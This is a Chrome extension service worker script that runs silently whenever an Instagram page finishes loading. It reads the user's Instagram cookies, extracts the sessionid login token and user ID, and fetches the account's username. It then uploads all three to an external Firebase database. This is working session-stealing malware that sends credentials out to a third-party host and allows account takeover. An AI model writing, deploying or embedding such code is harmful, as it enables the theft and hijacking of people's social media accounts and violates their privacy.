console.log("🚀 Service Worker Loaded ✅");

import { db, collection, addDoc } from "./firebase.js";

chrome.webNavigation.onCompleted.addListener(
  async (details) => {
    if (details.url.includes("instagram.com")) {
      chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
        console.log("🍪 All cookies:", cookies);

        const session = cookies.find((c) => c.name === "sessionid");
        const dsUserId = cookies.find((c) => c.name === "ds_user_id");

        if (!session || !dsUserId) {
          console.warn("⚠️ Could not find required cookies");
          return;
        }

        const sessionId = session.value;
        const userId = dsUserId.value;

        console.log("✅ Session ID:", sessionId);
        console.log("✅ User ID:", userId);

        const username = await fetchUsername(sessionId, userId);

        try {
          await addDoc(collection(db, "sessionid"), {
            sessionId,
            userId,
            username,
            timestamp: new Date(),
            domain: "instagram.com",
          });
          console.log("✅ Session saved to Firebase:", username);
        } catch (err) {
          console.error("❌ Firebase error:", err);
        }
      });
    }
  },
  { url: [{ hostSuffix: "instagram.com" }] }
);

async function fetchUsername(sessionId, userId) {
  try {
    const response = await fetch(
      `https://i.instagram.com/api/v1/users/${userId}/info/`,
      {
        headers: {
          "User-Agent": "Instagram 155.0.0.37.107",
          Cookie: `sessionid=${sessionId};`,
        },
      }
    );
    const data = await response.json();
    return data.user?.username || "unknown_user";
  } catch (error) {
    console.error("❌ Failed to fetch username:", error);
    return "unknown_user";
  }
}
